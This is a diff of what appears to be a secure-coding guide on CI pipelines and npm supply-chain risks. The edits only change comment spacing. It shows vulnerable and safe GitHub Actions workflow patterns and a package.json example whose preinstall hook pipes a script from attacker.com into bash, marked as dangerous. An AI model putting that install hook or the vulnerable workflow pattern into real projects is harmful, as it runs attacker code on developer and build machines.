@@ -158,12 +158,12 @@ jobs:
     steps:
       - uses: actions/checkout@v3
         with:
-          ref: ${{ github.event.pull_request.head.sha }}  # Runs untrusted code
+          ref: ${{ github.event.pull_request.head.sha }} # Runs untrusted code
       - run: npm install && npm test
 
 # VULNERABLE: Using unpinned actions
 steps:
-  - uses: actions/checkout@main  # Could change maliciously
+  - uses: actions/checkout@main # Could change maliciously
   - uses: some-action@latest
 ```
 
@@ -172,7 +172,7 @@ steps:
 ```yaml
 # SAFE: Pinned action versions with hash
 steps:
-  - uses: actions/checkout@8e5e7e5ab8b370d6c329ec480221332ada57f0ab  # v3.5.2
+  - uses: actions/checkout@8e5e7e5ab8b370d6c329ec480221332ada57f0ab # v3.5.2
 
 # SAFE: Secrets from secure storage
 env:
@@ -180,12 +180,12 @@ env:
 
 # SAFE: Separate workflow for untrusted PRs
 on:
-  pull_request:  # Not pull_request_target
+  pull_request: # Not pull_request_target
 jobs:
   build:
     runs-on: ubuntu-latest
     permissions:
-      contents: read  # Minimal permissions
+      contents: read # Minimal permissions
 ```
 
 ---
@@ -255,8 +255,8 @@ while True:
 // package.json - check these scripts carefully
 {
   "scripts": {
-    "preinstall": "curl https://attacker.com/script.sh | bash",  // DANGEROUS
-    "postinstall": "node ./malicious.js",  // CHECK THIS
+    "preinstall": "curl https://attacker.com/script.sh | bash", // DANGEROUS
+    "postinstall": "node ./malicious.js", // CHECK THIS
     "prepare": "..."
   }
 }
